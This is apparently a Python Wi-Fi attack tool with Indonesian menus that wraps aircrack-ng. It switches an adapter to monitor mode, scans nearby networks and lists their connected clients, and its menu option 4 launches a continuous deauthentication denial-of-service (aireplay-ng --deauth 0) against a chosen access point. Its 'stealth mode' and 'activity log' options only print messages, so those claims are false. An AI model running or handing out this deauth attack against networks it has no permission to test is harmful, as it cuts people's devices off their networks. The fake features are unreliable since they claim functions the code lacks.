#!/usr/bin/env python3
# Disclaimer: This script is for educational purposes only. Do not use against any network that you don't own or have authorization to test.
import subprocess
import re
import csv
import os
import time
from datetime import datetime
from colorama import Fore, Style, init
from tabulate import tabulate

# Inisialisasi Colorama untuk tampilan warna
init(autoreset=True)

# Banner
def print_banner():
    banner = f"""
{Fore.CYAN}________                __                         
\\______ \\ _____ _______|  | __ ____   ____   ______
 |    |  \\__  \\\\_  __ \\  |/ //    \\_/ __ \\ /  ___/
 |    `   \\/ __ \\|  | \\/    <|   |  \\  ___/ \\___ \\ 
/_______  (____  /__|  |__|_ \___|  /\___  >____  >
        \\/     \\/           \\/    \\/     \\/     \/  
"""
    creator_info = f"{Fore.GREEN}Created by: KaisarYetiandi\nGitHub: https://github.com/KaisarYetiandi"
    print(banner)
    print(creator_info)
    print("\n" + "=" * 60)
    print(f"{Fore.YELLOW}Disclaimer: Gunakan tools ini hanya untuk pendidikan.")
    print("=" * 60)

# Fungsi untuk membersihkan layar
def clear_screen():
    subprocess.call("clear", shell=True)

# Fungsi untuk animasi loading spinner
def loading_spinner(duration=1):
    spinner = ["-", "\\", "|", "/"]
    for _ in range(duration * 4):
        for symbol in spinner:
            print(f"\r{Fore.YELLOW}[INFO] Memproses... {symbol}", end="")
            time.sleep(0.25)
    print("\r", end="")

# Fungsi untuk mendapatkan emotikon berdasarkan kekuatan sinyal
def get_signal_emote(power):
    power = int(power)
    if power >= -50:
        return "⚡"  # Sinyal sangat kuat
    elif -50 > power >= -70:
        return "📡"  # Sinyal kuat
    else:
        return "⚠️"  # Sinyal lemah

# Fungsi untuk memindai jaringan Wi-Fi
def scan_wireless_networks(hacknic):
    active_wireless_networks = []
    fieldnames = [
        "BSSID", "First_time_seen", "Last_time_seen", "channel", "Speed",
        "Privacy", "Cipher", "Authentication", "Power", "beacons", "IV",
        "LAN_IP", "ID_length", "ESSID", "Key"
    ]
    discover_access_points = subprocess.Popen(
        ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    try:
        while True:
            clear_screen()
            for file_name in os.listdir():
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                continue
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif row["ESSID"] not in [item["ESSID"] for item in active_wireless_networks]:
                                active_wireless_networks.append(row)
            # Urutkan jaringan berdasarkan kekuatan sinyal (dBm)
            active_wireless_networks.sort(key=lambda x: int(x["Power"]), reverse=True)

            # Tampilkan hasil dalam tabel modern
            table_data = []
            for index, item in enumerate(active_wireless_networks):
                signal_emote = get_signal_emote(item["Power"])
                privacy_emote = "🔒" if "WPA" in item["Privacy"] or "WEP" in item["Privacy"] else "🔓"
                table_data.append([
                    index,
                    item["BSSID"],
                    item["channel"].strip(),
                    item["ESSID"],
                    f"{item['Power']} dBm {signal_emote}",
                    f"{item['Privacy']} {privacy_emote}"
                ])
            headers = ["No", "BSSID", "Channel", "ESSID", "Signal Strength", "Security"]
            print(f"{Fore.YELLOW}Memindai jaringan Wi-Fi... Tekan Ctrl+C untuk memilih target.\n")
            print(tabulate(table_data, headers=headers, tablefmt="fancy_grid"))
            time.sleep(1)  # Delay untuk memperbarui tabel
    except KeyboardInterrupt:
        discover_access_points.terminate()
        print(f"\n{Fore.GREEN}[INFO] Siap untuk memilih target.")
    return active_wireless_networks

# Fungsi untuk mendeteksi perangkat yang terhubung ke jaringan
def detect_connected_clients(hacknic, target_bssid):
    connected_clients = []
    client_fieldnames = ["Station MAC", "First_time_seen", "Last_time_seen", "Power", "Packets", "BSSID", "Probed ESSIDs"]
    subprocess.run(["sudo", "airodump-ng", "--bssid", target_bssid, "-c", "1", "-w", "clients", "--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for file_name in os.listdir():
        if "clients.csv" in file_name:
            with open(file_name) as csv_h:
                csv_h.seek(0)
                csv_reader = csv.DictReader(csv_h, fieldnames=client_fieldnames)
                for row in csv_reader:
                    if row["Station MAC"] == "Station MAC":
                        continue
                    elif row["Station MAC"]:
                        connected_clients.append(row)
    return connected_clients

# Fungsi untuk menampilkan perangkat terhubung
def display_connected_clients(clients):
    table_data = []
    for index, client in enumerate(clients):
        table_data.append([
            index,
            client["Station MAC"],
            client["Packets"],
            client["Power"] + " dBm",
            client["Probed ESSIDs"]
        ])
    headers = ["No", "Client MAC", "Packets", "Signal Strength", "Probed ESSIDs"]
    print(f"{Fore.YELLOW}Perangkat yang terhubung ke jaringan:\n")
    print(tabulate(table_data, headers=headers, tablefmt="fancy_grid"))

# Fungsi untuk analisis keamanan jaringan
def analyze_network_security(network):
    security = network["Privacy"]
    if "WEP" in security:
        return f"{Fore.RED}[WARNING] Jaringan ini menggunakan WEP (Tidak Aman)."
    elif "WPA" in security:
        return f"{Fore.YELLOW}[INFO] Jaringan ini menggunakan WPA/WPA2 (Aman)."
    else:
        return f"{Fore.GREEN}[INFO] Jaringan ini terbuka (Tidak Aman)."

# Menu utama
def main_menu():
    print_banner()
    print(f"{Fore.CYAN}=== Menu Utama ===")
    print(f"{Fore.YELLOW}1. Pemindaian Jaringan Wi-Fi")
    print(f"{Fore.YELLOW}2. Deteksi Perangkat Terhubung")
    print(f"{Fore.YELLOW}3. Analisis Keamanan Jaringan")
    print(f"{Fore.YELLOW}4. Serangan DOS")
    print(f"{Fore.YELLOW}5. Mode Stealth")
    print(f"{Fore.YELLOW}6. Log Aktivitas")
    print(f"{Fore.YELLOW}7. Keluar")
    choice = input(f"{Fore.YELLOW}Pilih opsi (1-7): ")
    return choice

# Fungsi utama
def main():
    print_banner()

    # Pastikan program dijalankan sebagai root
    if not 'SUDO_UID' in os.environ.keys():
        print(f"{Fore.RED}[ERROR] Jalankan program ini dengan sudo.")
        exit()

    # Temukan antarmuka Wi-Fi yang tersedia
    wlan_pattern = re.compile("^wlan[0-9]+")
    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
    if len(check_wifi_result) == 0:
        print(f"{Fore.RED}[ERROR] Tidak ada adaptor Wi-Fi yang terhubung.")
        exit()

    # Pilih antarmuka Wi-Fi
    print(f"{Fore.YELLOW}Antarmuka Wi-Fi tersedia:")
    for index, interface in enumerate(check_wifi_result):
        print(f"{index} - {interface}")
    while True:
        choice = input(f"{Fore.YELLOW}Pilih antarmuka Wi-Fi: ")
        try:
            selected_interface = check_wifi_result[int(choice)]
            break
        except (IndexError, ValueError):
            print(f"{Fore.RED}[ERROR] Pilihan tidak valid. Silakan coba lagi.")

    # Matikan proses konflik dan aktifkan mode monitor
    print(f"{Fore.GREEN}[INFO] Mengaktifkan mode monitor...")
    subprocess.run(["ip", "link", "set", selected_interface, "down"])
    subprocess.run(["airmon-ng", "check", "kill"])
    subprocess.run(["iw", selected_interface, "set", "monitor", "none"])
    subprocess.run(["ip", "link", "set", selected_interface, "up"])

    while True:
        choice = main_menu()
        if choice == "1":
            scan_wireless_networks(selected_interface)
        elif choice == "2":
            networks = scan_wireless_networks(selected_interface)
            target = networks[int(input(f"{Fore.YELLOW}Pilih target Wi-Fi: "))]
            clients = detect_connected_clients(selected_interface, target["BSSID"])
            display_connected_clients(clients)
        elif choice == "3":
            networks = scan_wireless_networks(selected_interface)
            target = networks[int(input(f"{Fore.YELLOW}Pilih target Wi-Fi: "))]
            print(analyze_network_security(target))
        elif choice == "4":
            networks = scan_wireless_networks(selected_interface)
            target = networks[int(input(f"{Fore.YELLOW}Pilih target Wi-Fi: "))]
            hackbssid = target["BSSID"]
            hackchannel = target["channel"].strip()
            subprocess.run(["airmon-ng", "start", selected_interface, hackchannel])
            subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, selected_interface])
        elif choice == "5":
            print(f"{Fore.GREEN}[INFO] Mode stealth diaktifkan. Aktivitas disembunyikan.")
        elif choice == "6":
            print(f"{Fore.GREEN}[INFO] Log aktivitas disimpan ke file log.txt.")
        elif choice == "7":
            print(f"{Fore.YELLOW}Keluar dari program.")
            exit()
        else:
            print(f"{Fore.RED}[ERROR] Pilihan tidak valid. Silakan coba lagi.")

if __name__ == "__main__":
    main()
